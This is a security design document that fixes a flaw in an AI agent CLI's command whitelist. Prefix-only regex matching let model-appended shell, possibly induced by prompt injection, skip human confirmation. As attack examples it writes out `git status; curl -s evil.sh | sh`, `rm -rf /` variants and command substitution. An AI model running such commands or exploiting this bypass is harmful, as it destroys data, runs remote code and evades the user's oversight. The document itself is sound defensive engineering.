# Whitelist gate hardening (A-1)

Remediation for the Critical finding in `docs/adversarial-review-2026-11.md`.
Status: **implemented 2026-11-18** (A-1 and A-2 together, as sequenced below).
Decisions 1 and 3 are settled; decision 2 is running with its conservative default
and is still open.

Two things written here before implementation turned out to be wrong, recorded
because both changed the design:

- **Brace expansion cannot be refused structurally.** This doc listed `{a,b}`
  alongside `$( )` and `${ }` as "the tree refuses these". It does not: the parser
  leaves `{a,b}` inside a `Lit` and the expand layer fans it out at runtime, so
  there is no node to check. Refusing it would mean a textual hunt for braces -
  exactly the method this design rejects. So brace expansion behaves like globbing,
  which always did: **an approved command may act on more arguments than its text
  shows.** `env/decompose_test.go` fixes that as a test rather than a footnote.
- **The AST walk, not the right anchor, is what closes A-1.** A control run that
  removed only the anchor still blocked every separator bypass, because no leaf
  command of `echo hi; rm -rf /` matches without the other being examined. The
  anchor is a second layer that stops a single command from carrying unexamined
  trailing text and makes `echo .*`-shaped entries mean what they appear to mean.
  Both are wanted; the order of importance is the reverse of what this plan
  implied.

## The bug

`ui/interactive.go:26` compiles each whitelist entry as `^(?:pattern)` - anchored at
the start, never at the end - and `shouldAskConfirmation` skips the human whenever
that matches. So a pattern matching a *prefix* approves the whole command, including
any shell the model appends to it. `whitelist_actions: ["git status"]` approves
`git status; curl -s evil.sh | sh`.

Confirmed end-to-end against the real CLI and `testdata/fakesushi`: with
`agent.whitelist_actions=["echo"]` and `agent.mode=confirm`,
`echo hi; touch /tmp/wlpwned` produced no prompt and created the file; the same script
with no whitelist prompted and did not execute. Reproduction recipe in the review doc.

## Why this is Critical and not a convenience bug

`whitelist_actions` is a **standing authorization a human grants so they can stop
reading commands**. It is the only place confirm mode encodes what the human actually
agreed to. Bypassing it does not degrade a nicety - it deletes the mode, silently, for
exactly the users who turned it on because they intended to stop looking.

**Threat model.** The attacker authors `command` strings, which is the model: directly
buggy, or steered by prompt injection from anything it reads - repo files, comments,
command output, fixture text. The victim is the human who configured the whitelist.
A-1 is not the hostile-server path (that is A-11); the whitelist does not gate the
server at all.

**Reach.** Config file, `-c agent.whitelist_actions=…`, and inherited by every subagent
because `host/spawn.go:93` routes a child's confirmations through the parent's
`Interactive` (`bubblingHooks`). One call site, `ui/interactive.go:26`, gates the whole
feature - which is the good news: there is exactly one place to fix.

## Why a better regex cannot close this

The gate matches **text**; the shell executes **a program**. A text rule has to
enumerate the metacharacter grammar, and bash's list is longer than anyone maintains:
`;` `;;` `;&` `;;&` `|` `||` `&&` newline `&` `$()` backticks `<()` `>()` `$(…)` nested
inside a parameter expansion, `((…))`, heredocs and here-strings, `\`-continuations that
splice a newline, `eval`, `source`, function definitions, aliases. Each is a line of
defence in the regex approach and one `switch` case in the AST approach.

**Right-anchoring alone is also not enough, because the shipped example teaches a weak
pattern.** `^(?:echo)\s*$` closes the separator injection - but `echo .*`, which
`ui/interactive_test.go` currently blesses as a sample entry, still matches anything
after `echo `. The anchor fixes the matcher; it does nothing about a pattern the user
was encouraged to write too wide.

## Options

| | Closes separator injection | Closes weak prefix patterns | Keeps upstream semantics | Cost |
|---|---|---|---|---|
| **A** Right-anchor only: `^(?:p)\s*$` | Yes | No | No | 1 line |
| **B** Prefix + reject shell metachars in the remainder | Mostly | No | Yes | ~30 lines, needs a metachar list nobody will finish |
| **C** Parse the command; match every top-level simple command in full | Yes | Yes (per-pattern, with a warning) | No | one new file + gate rewrite |
| **D** Document the prefix behaviour only | No | No | Yes | docs |

**Recommend C**, with A's full-match rule applied *per command*, and a load-time warning
for patterns shaped like `.*`/`.+` so the wide-pattern case is at least surfaced.

## Proposed design

**`env.Decompose(command) ([]SimpleCommand, error)` - new, in `env`.** Put it where bash
semantics already live. `env/local.go:128` already calls
`syntax.NewParser().Parse(...)` and fails closed on a parse error before executing, so
this uses **the same parser on the same input the interpreter will run**: the gate and
the execution agree by construction rather than by both of us guessing what bash does.
(`ui` does not currently import `env`, and `env` imports neither `ui` nor `agent`, so the
edge is acyclic and points the right way.)

It returns the top-level commands when the program is exactly
`cmd1 [ ; | && | || | \n ] cmd2 …` of plain simple commands, and a typed reason when it
is not. Anything it cannot describe as a plain command list is not auto-approvable.

**`ui/interactive.go`.** `New` compiles `^(?:pattern)\s*$`. `shouldAskConfirmation`
decomposes, and asks unless *every* top-level command matches some pattern fully. Any
decompose error asks. Fail closed on everything.

**Also in this change (A-2, same file, same root cause).** Validate `mode` against
`{confirm, human, yolo}` at `agent.ConfigFromMap` and fail loudly, restoring what
upstream's pydantic `Literal` already enforced; and make the gate ask unless the mode is
*known* to be non-interactive, so an unknown value can never widen authority.

**Make the nag educational.** The confirmation prompt should say what broke the
whitelist - "Execute … (whitelist does not cover `$(…)`)" - so a human learns the rule
instead of just getting interrupted. This is the difference between a stricter gate
people keep and one they delete.

### Fail-closed matrix

| Command shape | Verdict | Why |
|---|---|---|
| `git status` | approve if it matches | plain simple command |
| `git status --short` | approve if `^git status --short$` matches | full match per command |
| `git status; rm -rf /` | **ask** | two commands; the second is unmatched |
| `git status && rm -rf /` | **ask** | same |
| `echo hi \| wc -l` | **ask** | pipeline; both sides must match |
| `echo $(rm -rf /)` | **ask** | command substitution, not a plain word |
| `echo 'a; b'` | approve if it matches | **one** command, literal semicolon - the false positive a text blacklist gets wrong and the AST does not |
| `echo hi > /etc/hosts` | **ask** (decision 2) | redirection is a side effect the pattern does not express |
| `cat <<EOF … EOF` | **ask** | heredoc |
| `(cd /; rm -rf x)` | **ask** | subshell |
| unparseable | **ask** | fail closed, always |

`echo 'a; b'` is the row that argues for C over B: quoting is exactly the case where
text matching and shell meaning diverge, and the parser is already in the tree.

## Honest limits of C

C closes the **injection** class: an authorized command accreting unauthorized shell.
It does not close the **confused deputy** class - a command the human genuinely
whitelisted that executes its own arguments (`find -exec`, `xargs sh -c`, `awk
'BEGIN{system(...)}'`, `git -c core.pager=…`, `python -c`). That is not solvable by
matching at all; it needs either per-program argument policy (out of scope, and a
bottomless pit) or a sandbox, which is the real answer and a separate project. The docs
should say this plainly, so nobody reads C as "whitelisting is safe now".

## Compatibility

- **This is a deliberate divergence from upstream** (`re.match` is start-anchored).
  Upstream is also vulnerable; that does not become our contract. Recorded here so a
  future "port fidelity" pass does not undo it as a bug - leave a pointer to this doc at
  the call site when it lands.
- **No shipped default changes**: `config/configs/mini.yaml` sets no `whitelist_actions`,
  so only users who opted in are affected, and they get *more* prompts - the safe
  direction.
- No config format change; `whitelist_actions` stays a list of regexes.

## Test plan

- Keep `TestWhitelistIsPrefixAnchored` - the left edge must still refuse.
- Rename the two tests whose names/messages imply the whole command is matched, and
  delete the `echo .*` example from them.
- New table-driven test, one row per construct above, asserting the verdict.
- Corpus test: `Decompose` must agree with `env.Local`'s parse on every command in
  `testdata/` and on a synthetic set of bash constructs - the gate and the interpreter
  may not disagree about what a command is.
- Negative control: revert the anchor and confirm the injection row fails (the audit's
  fakesushi recipe is the end-to-end version).
- Re-run the whole suite and `-race ./ui/ ./host/ ./job/`; the wake tests are the ones
  most likely to be sensitive to gate changes.

## Sequencing

1. **A-1 + A-2** as one "gate hardening" change - same file, same root cause ("the gate
   is not where you think it is"), and the reviewer's own top next-review item.
2. **A-3** separately: the `proj[cut]` guard plus making `pickCut` return `(cut, ok)` so
   no caller can forget, and clamping a negative `ExtraKeptN`. A crash, not a policy
   change, so it should not ride with a semantics change.
3. A-5, A-6, A-7 next; A-8 through A-13 triage later.

## Decisions needed

1. **Strictness.** - **Settled: AST parsing**, per the owner, with `env.Decompose`
   returning the entire parse tree rather than a flattened command list, and the
   whitelist as a separate walk over it. That choice is better than the one proposed
   here, and the reason is `env/local.go:183`: Local already runs the parsed
   `*syntax.File` via `runner.Run(cctx, file)`, so the tree is the unit of execution,
   and returning it means a future blacklist, sanitiser or rewriter acts on the object
   that actually runs instead of building a second, text-based API that can drift.
2. **Redirections.** Always ask (recommended), or allow writes to paths inside the
   session's workdir? The latter is friendlier for `> build.log` and needs a path rule
   that is itself security-relevant.
3. **Upstream fidelity.** - **Settled: no.** It is a security regression upstream,
   and the divergence is documented at the call site (`ui/whitelist.go`) and in
   `config/configs/mini.yaml` so a future port-fidelity pass does not undo it. A-2
   is the mirror image: there the port dropped an upstream *guard* and this change
   restores it.
